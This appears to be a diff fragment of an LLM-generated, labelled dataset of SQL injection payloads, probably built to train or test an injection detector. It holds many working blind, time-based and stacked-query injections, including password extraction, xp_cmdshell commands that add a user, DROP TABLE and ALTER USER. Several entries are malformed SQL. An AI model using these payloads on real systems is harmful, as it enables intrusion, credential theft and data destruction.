+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '1' AND EXISTS (SELECT * FROM users WHERE 1=1)')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "comment_insert",
+    "payload": "1' AND 1=(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END) --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '1' AND 1=(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END) --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "comment_insert",
+    "payload": "1'); WAITFOR DELAY '0:0:5' AND ('%",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '1'); WAITFOR DELAY '0:0:5' AND ('%')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "comment_insert",
+    "payload": "1' XOR 1=1 --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '1' XOR 1=1 --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_boolean",
+    "template_context": "comment_insert",
+    "payload": "1' LIKE '%' --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '1' LIKE '%' --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "login",
+    "payload": "'; WAITFOR DELAY '0:0:3' IF USER_ID() = 1;--",
+    "full_query": "SELECT * FROM users WHERE username = ''; WAITFOR DELAY '0:0:3' IF USER_ID() = 1;--' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "login",
+    "payload": "1')) AND SLEEP(5) AND (1=1 --",
+    "full_query": "SELECT * FROM users WHERE username = '1')) AND SLEEP(5) AND (1=1 --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "login",
+    "payload": "' OR 1>1 UNION ALL SELECT NULL, NULL, NULL FROM DUAL #",
+    "full_query": "SELECT * FROM users WHERE username = '' OR 1>1 UNION ALL SELECT NULL, NULL, NULL FROM DUAL #' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "login",
+    "payload": "'); BENCHMARK(1000000, md5('123')) AND ('1'='1",
+    "full_query": "SELECT * FROM users WHERE username = ''); BENCHMARK(1000000, md5('123')) AND ('1'='1' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "login",
+    "payload": "/*'*/and benchmark(1000000,'a');--",
+    "full_query": "SELECT * FROM users WHERE username = '/*'*/and benchmark(1000000,'a');--' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "login",
+    "payload": "')); IF OBJECT_ID('tempdb..#t') IS NULL CREATE TABLE #t(x INT); INSERT INTO #t VALUES(1); DECLARE @x INT = (SELECT COUNT(*) FROM #t); IF @x > 0 WAITFOR DELAY '0:0:@x'; --",
+    "full_query": "SELECT * FROM users WHERE username = '')); IF OBJECT_ID('tempdb..#t') IS NULL CREATE TABLE #t(x INT); INSERT INTO #t VALUES(1); DECLARE @x INT = (SELECT COUNT(*) FROM #t); IF @x > 0 WAITFOR DELAY '0:0:@x'; --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "login",
+    "payload": "\")) AND DBMS_PIPE.RECEIVE_MESSAGE(DBMS_CRYPTO.HASH_TO_RAW('attack',DBMS_CRYPTO.HASH_SH256),5)=DBMS_PIPE.RECEIVE_MESSAGE(DBMS_CRYPTO.HASH_TO_RAW('attack',DBMS_CRYPTO.HASH_SH256),5) --",
+    "full_query": "SELECT * FROM users WHERE username = '\")) AND DBMS_PIPE.RECEIVE_MESSAGE(DBMS_CRYPTO.HASH_TO_RAW('attack',DBMS_CRYPTO.HASH_SH256),5)=DBMS_PIPE.RECEIVE_MESSAGE(DBMS_CRYPTO.HASH_TO_RAW('attack',DBMS_CRYPTO.HASH_SH256),5) --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "login",
+    "payload": "'; WAITFOR DELAY '0:0:2' IF EXISTS(SELECT 1 FROM users WHERE username LIKE 'admin') --",
+    "full_query": "SELECT * FROM users WHERE username = ''; WAITFOR DELAY '0:0:2' IF EXISTS(SELECT 1 FROM users WHERE username LIKE 'admin') --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "login",
+    "payload": "1' OR ASCII(SUBSTRING(username, 1, 1)) > 97 AND BENCHMARK(1000000, ' ') --",
+    "full_query": "SELECT * FROM users WHERE username = '1' OR ASCII(SUBSTRING(username, 1, 1)) > 97 AND BENCHMARK(1000000, ' ') --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "login",
+    "payload": "' OR 1=1 AND SLEEP(2) AND '%'='%",
+    "full_query": "SELECT * FROM users WHERE username = '' OR 1=1 AND SLEEP(2) AND '%'='%' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "login",
+    "payload": "/*'*/AND ( SELECT 1 FROM information_schema.tables WHERE table_schema = DATABASE() AND table_name = 'users' ) --",
+    "full_query": "SELECT * FROM users WHERE username = '/*'*/AND ( SELECT 1 FROM information_schema.tables WHERE table_schema = DATABASE() AND table_name = 'users' ) --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "search",
+    "payload": "1' AND (SELECT 1 FROM information_schema.tables WHERE table_name='users') = 1 --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1' AND (SELECT 1 FROM information_schema.tables WHERE table_name='users') = 1 --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "search",
+    "payload": "1\"; WAITFOR DELAY '0:0:10'; --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1\"; WAITFOR DELAY '0:0:10'; --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "search",
+    "payload": "1' OR 1=1; IF (CHAR_LENGTH(SELECT 1))=1 THEN SLEEP(5); --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1' OR 1=1; IF (CHAR_LENGTH(SELECT 1))=1 THEN SLEEP(5); --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "search",
+    "payload": "' AND (SELECT SLEEP(5) FROM users WHERE username='admin') --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' AND (SELECT SLEEP(5) FROM users WHERE username='admin') --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "search",
+    "payload": "' OR (CAST(SUBSTRING((SELECT version()), 1, 1) AS UNSIGNED) > 5) --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' OR (CAST(SUBSTRING((SELECT version()), 1, 1) AS UNSIGNED) > 5) --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "search",
+    "payload": "' AND (BENCHMARK(1000000, (SELECT 1))) --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' AND (BENCHMARK(1000000, (SELECT 1))) --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "search",
+    "payload": "\" OR EXISTS(SELECT * FROM information_schema.tables WHERE table_schema='database_name' AND table_name='users') --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%\" OR EXISTS(SELECT * FROM information_schema.tables WHERE table_schema='database_name' AND table_name='users') --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "search",
+    "payload": "' OR (ASCII(SUBSTRING((SELECT user()), 1, 1)) = 97) --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' OR (ASCII(SUBSTRING((SELECT user()), 1, 1)) = 97) --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "search",
+    "payload": "' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 1/0 END --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 1/0 END --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "search",
+    "payload": "' OR ASCII(SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1)) = (SELECT ASCII('a')) --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' OR ASCII(SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1)) = (SELECT ASCII('a')) --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "search",
+    "payload": "--' OR BENCHMARK(1000000, SELECT 1) --'",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%--' OR BENCHMARK(1000000, SELECT 1) --'%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "search",
+    "payload": "' UNION SELECT NULL, NULL, NULL, BENCHMARK(1000000, CONCAT(user(), ':', host())) FROM mysql.user --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' UNION SELECT NULL, NULL, NULL, BENCHMARK(1000000, CONCAT(user(), ':', host())) FROM mysql.user --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "user_lookup",
+    "payload": "' OR 1=1 AND SLEEP(5)",
+    "full_query": "SELECT * FROM users WHERE id = ' OR 1=1 AND SLEEP(5)",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "user_lookup",
+    "payload": "-- OR 1=1 AND BENCHMARK(1000000,MD5('a'))",
+    "full_query": "SELECT * FROM users WHERE id = -- OR 1=1 AND BENCHMARK(1000000,MD5('a'))",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "user_lookup",
+    "payload": "' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') > 0 AND SLEEP(5)",
+    "full_query": "SELECT * FROM users WHERE id = ' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') > 0 AND SLEEP(5)",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "user_lookup",
+    "payload": "-- OR (SELECT BENCHMARK(1000000,'sha1(a')) = 1 AND '1' = '1'",
+    "full_query": "SELECT * FROM users WHERE id = -- OR (SELECT BENCHMARK(1000000,'sha1(a')) = 1 AND '1' = '1'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "user_lookup",
+    "payload": "' OR '1' = '1' UNION ALL SELECT NULL, (SELECT USER()), NULL, NULL#",
+    "full_query": "SELECT * FROM users WHERE id = ' OR '1' = '1' UNION ALL SELECT NULL, (SELECT USER()), NULL, NULL#",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "user_lookup",
+    "payload": "' OR 1=1 AND (SELECT SUBSTRING(SLEEP(5),1,1)) >= 0",
+    "full_query": "SELECT * FROM users WHERE id = ' OR 1=1 AND (SELECT SUBSTRING(SLEEP(5),1,1)) >= 0",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "user_lookup",
+    "payload": "' OR EXISTS(SELECT * FROM users WHERE id>0 AND (SELECT ASCII(SUBSTRING(PASSWORD,1,1)) FROM users LIMIT 1) > 0 AND SLEEP(5)",
+    "full_query": "SELECT * FROM users WHERE id = ' OR EXISTS(SELECT * FROM users WHERE id>0 AND (SELECT ASCII(SUBSTRING(PASSWORD,1,1)) FROM users LIMIT 1) > 0 AND SLEEP(5)",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "user_lookup",
+    "payload": "' OR 2=2; WAITFOR DELAY '0:0:5'",
+    "full_query": "SELECT * FROM users WHERE id = ' OR 2=2; WAITFOR DELAY '0:0:5'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "user_lookup",
+    "payload": "'; SELECT benchmark(1000000,'md5(a'))--",
+    "full_query": "SELECT * FROM users WHERE id = '; SELECT benchmark(1000000,'md5(a'))--",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "user_lookup",
+    "payload": "' OR 4=4 AND EXISTS(SELECT * FROM users WHERE id<0 AND (SELECT ord(mid(password,1,1)) FROM users LIMIT 1) < 123)",
+    "full_query": "SELECT * FROM users WHERE id = ' OR 4=4 AND EXISTS(SELECT * FROM users WHERE id<0 AND (SELECT ord(mid(password,1,1)) FROM users LIMIT 1) < 123)",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "order_filter",
+    "payload": "' OR (SELECT 1 FROM users WHERE username = 'admin') -- '",
+    "full_query": "SELECT * FROM orders WHERE status = '' OR (SELECT 1 FROM users WHERE username = 'admin') -- '' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "order_filter",
+    "payload": "/* WAITFOR DELAY '0:0:5' */ AND 1=1",
+    "full_query": "SELECT * FROM orders WHERE status = '/* WAITFOR DELAY '0:0:5' */ AND 1=1' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "order_filter",
+    "payload": "BENCHMARK(1000000, SHA2('payload', 256)) --",
+    "full_query": "SELECT * FROM orders WHERE status = 'BENCHMARK(1000000, SHA2('payload', 256)) --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "order_filter",
+    "payload": "' AND IF((SELECT ASCII(SUBSTRING(status, 1, 1)) FROM orders WHERE id=1), SLEEP(5), NULL) --",
+    "full_query": "SELECT * FROM orders WHERE status = '' AND IF((SELECT ASCII(SUBSTRING(status, 1, 1)) FROM orders WHERE id=1), SLEEP(5), NULL) --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "order_filter",
+    "payload": "' AND EXISTS(SELECT 1 FROM orders WHERE status LIKE '%admin%') AND '%'='",
+    "full_query": "SELECT * FROM orders WHERE status = '' AND EXISTS(SELECT 1 FROM orders WHERE status LIKE '%admin%') AND '%'='' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "order_filter",
+    "payload": "' UNION ALL SELECT NULL, NULL, NULL, NULL FROM (SELECT 1) WHERE 1=(SELECT Sleep(3)) #",
+    "full_query": "SELECT * FROM orders WHERE status = '' UNION ALL SELECT NULL, NULL, NULL, NULL FROM (SELECT 1) WHERE 1=(SELECT Sleep(3)) #' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "order_filter",
+    "payload": "' AND (SELECT 1 FROM (SELECT 1 FROM users WHERE username='testuser')) = 0 AND '%'='%",
+    "full_query": "SELECT * FROM orders WHERE status = '' AND (SELECT 1 FROM (SELECT 1 FROM users WHERE username='testuser')) = 0 AND '%'='%' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "order_filter",
+    "payload": "' AND (SELECT 1 FROM users WHERE username = 'admin') --",
+    "full_query": "SELECT * FROM orders WHERE status = '' AND (SELECT 1 FROM users WHERE username = 'admin') --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "order_filter",
+    "payload": "' OR (SELECT benchmark(1000000, sha2('payload', 256))) --",
+    "full_query": "SELECT * FROM orders WHERE status = '' OR (SELECT benchmark(1000000, sha2('payload', 256))) --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "order_filter",
+    "payload": "' OR EXISTS(SELECT 1 FROM orders WHERE status LIKE '%admin%') AND '%'='",
+    "full_query": "SELECT * FROM orders WHERE status = '' OR EXISTS(SELECT 1 FROM orders WHERE status LIKE '%admin%') AND '%'='' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "comment_insert",
+    "payload": "AND DBMS_PIPE.RECEIVE_MESSAGE('BOE', 5) FROM DUAL --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, 'AND DBMS_PIPE.RECEIVE_MESSAGE('BOE', 5) FROM DUAL --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "comment_insert",
+    "payload": "WAITFOR DELAY '0:0:5' --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, 'WAITFOR DELAY '0:0:5' --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "comment_insert",
+    "payload": "-- OR BENCHMARK(1000000, MD5('test'))",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '-- OR BENCHMARK(1000000, MD5('test'))')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "comment_insert",
+    "payload": "; WAITFOR DELAY '0:0:5' WHERE USER() LIKE 'admin'",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '; WAITFOR DELAY '0:0:5' WHERE USER() LIKE 'admin'')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "comment_insert",
+    "payload": "-- + AND EXISTS(SELECT * FROM sysobjects WHERE id = object_id(N'dbo.sysusers') AND type IN (N'SU', N'G'))",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '-- + AND EXISTS(SELECT * FROM sysobjects WHERE id = object_id(N'dbo.sysusers') AND type IN (N'SU', N'G'))')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "blind_time",
+    "template_context": "comment_insert",
+    "payload": "' OR 1=1 -- \"; EXEC xp_cmdshell 'ping -n 5 localhost'",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '' OR 1=1 -- \"; EXEC xp_cmdshell 'ping -n 5 localhost'')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "login",
+    "payload": "; WAITFOR DELAY '0:0:10'; --\"",
+    "full_query": "SELECT * FROM users WHERE username = '; WAITFOR DELAY '0:0:10'; --\"' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "login",
+    "payload": "OR '1'='1\";",
+    "full_query": "SELECT * FROM users WHERE username = 'OR '1'='1\";' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "login",
+    "payload": "); INSERT INTO sessions (username, token) VALUES ('admin', 'hacked'); --",
+    "full_query": "SELECT * FROM users WHERE username = '); INSERT INTO sessions (username, token) VALUES ('admin', 'hacked'); --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "login",
+    "payload": ";--'",
+    "full_query": "SELECT * FROM users WHERE username = ';--'' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "login",
+    "payload": "1 OR 'a'='a'",
+    "full_query": "SELECT * FROM users WHERE username = '1 OR 'a'='a'' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "login",
+    "payload": "OR 'a'='a",
+    "full_query": "SELECT * FROM users WHERE username = 'OR 'a'='a' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "login",
+    "payload": "' AND  ( SELECT NULL FROM dual ) --",
+    "full_query": "SELECT * FROM users WHERE username = '' AND  ( SELECT NULL FROM dual ) --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "search",
+    "payload": "; WAITFOR DELAY '0:0:5' AND (SELECT 1=1)",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%; WAITFOR DELAY '0:0:5' AND (SELECT 1=1)%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "search",
+    "payload": "; EXEC xp_cmdshell 'whoami'",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%; EXEC xp_cmdshell 'whoami'%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "search",
+    "payload": "' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='admin') --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='admin') --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "search",
+    "payload": "'/* DROP TABLE products */'",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%'/* DROP TABLE products */'%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "search",
+    "payload": "'-- DROP TABLE products'",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%'-- DROP TABLE products'%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "user_lookup",
+    "payload": "1')); WAITFOR DELAY '0:0:10'; --",
+    "full_query": "SELECT * FROM users WHERE id = 1')); WAITFOR DELAY '0:0:10'; --",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "user_lookup",
+    "payload": "1'); EXECUTE master..xp_cmdshell 'net user hacker P@ssw0rd /add'; --",
+    "full_query": "SELECT * FROM users WHERE id = 1'); EXECUTE master..xp_cmdshell 'net user hacker P@ssw0rd /add'; --",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "user_lookup",
+    "payload": "1;/**/ALTER USER admin IDENTIFIED BY 'newPassword'",
+    "full_query": "SELECT * FROM users WHERE id = 1;/**/ALTER USER admin IDENTIFIED BY 'newPassword'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "user_lookup",
+    "payload": "[\"1')) -- ; DROP TABLE users;\"",
+    "full_query": "SELECT * FROM users WHERE id = [\"1')) -- ; DROP TABLE users;\"",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
